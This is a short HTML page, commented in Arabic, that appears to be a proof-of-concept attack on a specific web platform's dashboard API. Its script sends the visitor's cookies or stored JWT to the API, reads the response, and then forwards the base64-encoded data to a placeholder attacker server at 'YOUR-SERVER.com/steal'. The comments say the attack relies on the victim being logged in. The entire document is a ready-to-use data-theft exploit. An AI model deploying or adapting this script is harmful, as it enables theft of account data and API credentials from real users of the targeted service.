<!DOCTYPE html>
<html>
<body>
<script>
// هذا يعمل فقط عندما الضحية مسجّل الدخول
// والمتصفح عنده JWT مخزّن في cookies/session

fetch("https://platform-api.wisprflow.ai/api/v1/dash/client_api", {
  credentials: "include"  // ← هذا يرسل cookies/JWT تلقائياً
})
.then(r => r.text())
.then(data => {
  // إظهار البيانات
  document.body.innerHTML = `<pre>${data}</pre>`;
  
  // إرسال البيانات إلى سيرفر المهاجم
  fetch("https://YOUR-SERVER.com/steal?data=" + btoa(data));
});
</script>
</body>
</html>
